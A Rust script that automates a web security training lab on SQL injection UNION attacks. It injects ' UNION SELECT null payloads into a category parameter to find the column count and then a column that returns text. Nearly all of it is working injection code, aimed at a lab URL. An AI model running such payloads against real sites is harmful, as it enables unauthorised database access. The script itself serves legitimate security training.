/*****************************************************************************
*
* Lab: SQL injection UNION attack, finding a column containing text
*
* Hack Steps: 
*      1. Inject payload into 'category' query parameter to determine
*         the number of columns
*      2. Add one additional null column at a time
*      3. Repeat this process, increasing the number of columns until you
*         receive a valid response
*      4. After determining the number of columns, replace each column with
*         the desired text one at a time.
*      5. Repeat this process until you receive a valid response.
*
******************************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aab008c0429371e813cd4be0012009e.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "category".yellow());
    flush_terminal();

    let main_page = fetch("/");
    let body = main_page.text().unwrap();
    let target_text = capture_pattern_from_text("retrieve the string: '(.*)'", &body);

    println!("⦗#⦘ Desired text: {}", target_text.blue());
    flush_terminal();

    for counter in 1..10 {
        let nulls = "null, ".repeat(counter);
        let payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // remove the last comma to make the syntax valid

        println!("❯❯ Trying payload: {}", payload);

        let injection_response = fetch(&format!("/filter?category={payload}"));
        if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response) {
            println!("⦗#⦘ Number of columns: {}", counter.to_string().green());

            for column in 1..counter + 1 {
                let mut new_payload = payload.clone();
                let start_index = 9 + 6 * column;
                let end_index = (9 + 6 * column) + 4;

                new_payload.replace_range(start_index..end_index, &format!("'{target_text}'"));

                println!("❯❯ Trying payload: {}", new_payload);

                let injection_response = fetch(&format!("/filter?category={new_payload}"));
                if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response)
                {
                    println!(
                        "⦗#⦘ the column containing text: {}",
                        column.to_string().green()
                    );

                    break;
                }
            }

            break;
        } else {
            continue;
        }
    }

    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn fetch(path: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn text_not_exist_in_response(text: &str, response: Response) -> bool {
    let body = response.text().unwrap();
    let regex = Regex::new(text).unwrap();
    if regex.find(&body).is_none() {
        true
    } else {
        false
    }
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
